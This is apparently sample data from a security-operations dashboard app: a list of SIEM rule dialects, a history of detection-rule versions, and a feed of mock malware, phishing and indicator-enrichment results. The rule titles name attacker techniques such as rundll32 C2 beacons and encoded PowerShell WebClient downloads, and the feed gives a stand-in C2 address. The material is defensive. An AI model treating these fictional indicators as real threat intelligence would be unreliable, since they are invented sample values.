    { id: 'sigma', name: 'Sigma Canonical YAML', short: 'Sigma', canParse: true, canRender: true, status: 'Ready', notes: 'Vendor-neutral detection specification with logsource, detection blocks, and timeframe.' },
    { id: 'splunk', name: 'Splunk Enterprise (SPL)', short: 'Splunk', canParse: true, canRender: true, status: 'Ready', notes: 'Supports index/sourcetype scoping, stats, eval, where, and tstats acceleration.' },
    { id: 'qradar', name: 'IBM QRadar (AQL)', short: 'QRadar', canParse: true, canRender: true, status: 'Ready', notes: 'Translates filters and aggregations to Ariel Query Language; refuses multi-step sequence joins.' },
    { id: 'elastic', name: 'Elastic Security (EQL / ES|QL)', short: 'Elastic', canParse: true, canRender: true, status: 'Ready', notes: 'Supports event category scoping, sequence by host.id, and wildcard predicates.' },
    { id: 'wazuh', name: 'Wazuh XML Rule Format', short: 'Wazuh', canParse: false, canRender: true, status: 'Ready', notes: 'Renders XML <rule> blocks with <field>, <match>, frequency, and <mitre> tags; refuses complex math.' },
    { id: 'chronicle', name: 'Google SecOps Chronicle (YARA-L 2.0)', short: 'Chronicle', canParse: true, canRender: true, status: 'Ready', notes: 'Renders events, match, outcome, and condition sections aligned to UDM fields.' },
    { id: 'crowdstrike', name: 'CrowdStrike Falcon LogScale (LQL)', short: 'CrowdStrike', canParse: true, canRender: true, status: 'Ready', notes: 'Renders Falcon event_simpleName pipelines with groupBy() and regex().' }
  ],

  ruleforgeHistory: [
    {
      id: 'v-104',
      parentId: 'v-103',
      title: 'Suspicious Rundll32 Outbound C2 & ProgramData DLL Execution',
      origin: 'authored' as const,
      dialect: 'sentinel',
      author: 's.chen@secops.local',
      timestamp: '2026-10-14 11:52 UTC',
      severity: 'critical',
      diffSummary: 'Added DestinationIp == 198.51.100.45 OR CommandLine contains sync_helper.dll correlation stage'
    },
    {
      id: 'v-103',
      parentId: 'v-102',
      title: 'Suspicious Rundll32 Network Connection to Non-Standard Host',
      origin: 'imported' as const,
      dialect: 'sigma',
      author: 'Event Analyzer Pivot',
      timestamp: '2026-10-14 11:46 UTC',
      severity: 'critical',
      diffSummary: 'Imported Sigma rule SIG-001 from Event Analyzer investigation DC01 & WKS-FINANCE04'
    },
    {
      id: 'v-102',
      parentId: 'v-101',
      title: 'PowerShell Encoded WebClient Stage-2 Download',
      origin: 'synthesized' as const,
      dialect: 'splunk',
      author: 'RuleForge Log Synthesizer',
      timestamp: '2026-10-14 10:15 UTC',
      severity: 'high',
      diffSummary: 'Auto-synthesized from 4 Sysmon & PowerShell 4104 JSONL events; pinned CommandLine and Image'
    },
    {
      id: 'v-101',
      parentId: null,
      title: 'Baseline Unsigned Rundll32 Execution',
      origin: 'authored' as const,
      dialect: 'sigma',
      author: 's.chen@secops.local',
      timestamp: '2026-10-13 17:30 UTC',
      severity: 'medium',
      diffSummary: 'Initial base rule creation'
    }
  ],

  initialActivityFeed: [
    {
      id: 'act-1',
      tool: 'malware' as ToolId,
      actionType: 'Binary Scan',
      description: 'invoice_q3.exe scanned — Cobalt Strike / AsyncRAT Beacon identified (52/71 engines)',
      timestamp: '2026-10-14 11:42 UTC',
      verdict: 'malicious' as VerdictType,
      scoreText: 'CRITICAL (87/100)',
      severity: 'critical' as const,
      targetSubTab: 'dashboard',
      unread: true
    },
    {
      id: 'act-2',
      tool: 'ioc' as ToolId,
      actionType: 'IOC Enrichment',
      description: '198.51.100.45 enriched across 28/33 sources — Active C2 & LummaC2 exfil node',
      timestamp: '2026-10-14 11:44 UTC',
      verdict: 'malicious' as VerdictType,
      scoreText: 'Malicious (92/100)',
      severity: 'critical' as const,
      targetSubTab: 'lookup',
      unread: true
    },
    {
      id: 'act-3',
      tool: 'events' as ToolId,
      actionType: 'EVTX Ingestion',
      description: 'DC01 & WKS-FINANCE04-Sysmon.evtx indexed — 24,891 events · 5 Sigma rules triggered',
      timestamp: '2026-10-14 11:50 UTC',
      verdict: 'malicious' as VerdictType,
      scoreText: '74 Sigma Hits',
      severity: 'critical' as const,
      targetSubTab: 'sigma',
      unread: true
    },
    {
      id: 'act-4',
      tool: 'phishing' as ToolId,
      actionType: 'Email Forensics',
      description: 'URGENT: Q3 Wire Transfer (#INV-99412) analyzed — DMARC Fail + C2 Hop + EXE Dropper',
      timestamp: '2026-10-14 11:38 UTC',
      verdict: 'malicious' as VerdictType,
      scoreText: 'UNSAFE (9.2/10)',
      severity: 'critical' as const,
      targetSubTab: 'dashboard',
      unread: false
    },
    {
      id: 'act-5',
      tool: 'ruleforge' as ToolId,
      actionType: 'Rule Translation',
      description: 'SIG-001 compiled to Sentinel KQL & Splunk SPL — 1 Wazuh sequence refusal flagged',
      timestamp: '2026-10-14 11:52 UTC',
      verdict: 'suspicious' as VerdictType,
      scoreText: 'v-104 Saved',
      severity: 'medium' as const,
      targetSubTab: 'author',
      unread: false
    },
    {
      id: 'act-6',
      tool: 'malware' as ToolId,
      actionType: 'Binary Scan',
      description: 'updater_svc.dll scanned — Unsigned DLL side-loading candidate on WKS-DEV09',
      timestamp: '2026-10-14 09:15 UTC',
      verdict: 'suspicious' as VerdictType,
      scoreText: 'MEDIUM (54/100)',
      severity: 'medium' as const,
      targetSubTab: 'static',
      unread: false
    }
  ]
};
